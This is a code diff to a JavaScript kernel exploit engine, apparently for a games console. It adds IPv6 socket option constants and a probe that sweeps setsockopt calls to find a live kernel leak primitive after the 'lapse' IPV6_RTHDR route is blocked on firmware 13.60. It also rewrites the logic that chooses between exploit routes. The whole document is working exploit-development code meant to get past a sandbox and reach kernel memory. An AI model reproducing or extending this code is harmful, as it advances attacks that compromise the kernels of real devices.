@@ -79,6 +79,13 @@ const SYS_EVF_CLEAR      = 0x221;
 const IPPROTO_IPV6       = 41;
 const IPV6_RTHDR         = 51;
 const IPV6_TCLASS        = 61;
+const IPV6_PKTINFO       = 46;
+const IPV6_NEXTHOP       = 48;
+const IPV6_HOPOPTS       = 49;
+const IPV6_DSTOPTS       = 50;
+const IPV6_RTHDRDSTOPTS  = 53;
+const IPV6_2292PKTOPTIONS = 25;
+const IPV6_MSFILTER      = 74;
 const AF_INET6           = 28;
 const AF_INET            = 2;
 const SOCK_STREAM        = 1;
@@ -1082,8 +1089,8 @@ export function makeBagagwaEngine(X) {
                 const rbuf = safeAlloc(0x80, "lapse-rthdr");
                 const lenb = safeAlloc(4, "lapse-optlen");
                 if (rbuf && lenb) {
-                    // minimal rthdr header; malformed -> EINVAL if reachable,
-                    // EPERM/ENOTCAPABLE if blocked by the sandbox.
+                    // rthdr = lapse's main leak primitive; malformed header so
+                    // EINVAL = reachable, EPERM/ENOTCAPABLE = sandbox-blocked.
                     rbuf.u8[0] = 0;
                     rbuf.u8[1] = 0x0f;
                     rbuf.u8[2] = 0;
@@ -1093,6 +1100,24 @@ export function makeBagagwaEngine(X) {
                     w32(lenb.u8, 0, 0x80);
                     const gt = await pcall("getsockopt(IPV6_RTHDR)", SYS_GETSOCKOPT, s6.s32, IPPROTO_IPV6, IPV6_RTHDR, rbuf.base, lenb.base);
                     res.rthdrGet = gt.failed ? gt.errText : gt.s32;
+
+                    // RTHDR is burned on 13.60, so sweep the other IPV6 options
+                    // for a live one that can still hold controlled kernel bytes.
+                    for (let z = 0; z < 0x80; z++) rbuf.u8[z] = 0;
+                    const sweep = [
+                        [IPV6_TCLASS, 4, "TCLASS"],
+                        [IPV6_PKTINFO, 20, "PKTINFO"],
+                        [IPV6_NEXTHOP, 16, "NEXTHOP"],
+                        [IPV6_HOPOPTS, 0x20, "HOPOPTS"],
+                        [IPV6_DSTOPTS, 0x20, "DSTOPTS"],
+                        [IPV6_RTHDRDSTOPTS, 0x20, "RTHDRDSTOPTS"],
+                        [IPV6_2292PKTOPTIONS, 0x20, "2292PKTOPTIONS"],
+                        [IPV6_MSFILTER, 0x20, "MSFILTER"],
+                    ];
+                    for (const sw of sweep) {
+                        const sr = await pcall("setsockopt(IPV6_" + sw[2] + ")", SYS_SETSOCKOPT, s6.s32, IPPROTO_IPV6, sw[0], rbuf.base, sw[1]);
+                        res["opt_" + sw[2]] = sr.failed ? sr.errText : sr.s32;
+                    }
                 } else {
                     note("[LAPSE-PROBE] setsockopt(IPV6_RTHDR) -> SKIPPED (alloc failed)");
                 }
@@ -1117,11 +1142,15 @@ export function makeBagagwaEngine(X) {
 
             const s6ok = !s6.failed;
             const rthdrReachable = res.rthdrSet === 0 || res.rthdrSet === "EINVAL";
+            const aliveOpts = ["TCLASS", "PKTINFO", "NEXTHOP", "HOPOPTS", "DSTOPTS", "RTHDRDSTOPTS", "2292PKTOPTIONS", "MSFILTER"]
+                .filter(nm => res["opt_" + nm] === 0 || res["opt_" + nm] === "EINVAL");
             const verdict = (!s6ok && s4.failed)
-                ? "SOCKETS BLOCKED -> lapse leak unbuildable, use waker-decrement route"
-                : (!rthdrReachable
-                    ? "sockets ok but IPV6_RTHDR blocked (" + res.rthdrSet + ")"
-                    : "LAPSE ROUTE VIABLE (sockets + IPV6 sockopts reachable)");
+                ? "SOCKETS BLOCKED -> use waker-decrement route"
+                : (rthdrReachable
+                    ? "LAPSE ROUTE VIABLE (IPV6_RTHDR reachable)"
+                    : (aliveOpts.length
+                        ? "RTHDR BURNED but alternate IPV6 opts live (" + aliveOpts.join(",") + ") -> adapt leak"
+                        : "ALL IPV6 RTHDR/opts blocked -> waker-decrement route"));
             note("[LAPSE-PROBE] VERDICT: " + verdict);
             flushMark("LAPSE-PROBE", verdict);
         } catch (e) {
